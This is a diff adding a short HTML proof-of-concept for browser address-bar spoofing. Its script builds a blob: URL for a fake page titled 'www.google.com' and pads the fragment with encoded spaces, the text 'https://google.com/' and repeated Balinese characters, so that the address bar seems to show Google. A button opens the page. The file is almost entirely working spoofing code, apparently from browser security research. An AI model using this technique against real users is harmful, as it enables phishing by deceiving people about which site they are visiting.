@@ -1,0 +1,17 @@
+<body >
+
+</body>
+<script>
+var haha = function(){
+
+
+  args = ['<title>www.google.com</title>', '<html><h1>Click Site Information<\/h1><\/html>'];
+ 
+  b = new Blob(args, {type: 'text/html'});
+  //evil_url = URL.createObjectURL(b) + '#' +'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20https://google.com/#ᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊ';
+  //evil_url = URL.createObjectURL(b) + '#' +'%20https://google.com/#ᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊ';
+  evil_url = URL.createObjectURL(b) + '#' +'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20https://google.com/#ᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊᬊ';
+  window.open(evil_url);
+};
+</script>
+<button onclick='haha()'>click me</button>
